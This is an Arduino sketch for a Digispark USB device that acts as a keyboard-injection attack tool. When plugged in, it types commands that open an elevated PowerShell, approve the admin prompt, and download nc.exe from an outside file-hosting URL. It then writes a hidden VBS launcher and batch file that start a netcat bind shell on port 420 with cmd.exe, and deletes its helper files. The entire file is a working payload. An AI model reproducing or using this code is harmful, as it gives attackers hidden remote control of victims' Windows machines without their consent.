#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A
  DigiKeyboard.sendKeyStroke(0);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,MOD_SHIFT_LEFT|MOD_CONTROL_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Invoke-WebRequest -Uri @http://download1480.mediafire.com/bfyemqy6iddg/6xuim9a2m1eu11f/nc.exe@ -outfile $env:userprofile@/nc.exe@");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER,MOD_SHIFT_LEFT|MOD_CONTROL_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cd %userprofile%");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("copy con silent.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("CreateObject(@Wscript.Shell@).Run @@@@ & WScript.Arguments(0) & @@@@, 0, False");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_C,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("copy con run.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("cd %userprofile%");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("nc.exe -l -p 420 -e cmd.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_C,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("Wscript @silent.vbs@ @run.bat@");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
   DigiKeyboard.print("del silent.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
   DigiKeyboard.print("del run.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
  digitalWrite(1, LOW);
}


void loop() {}
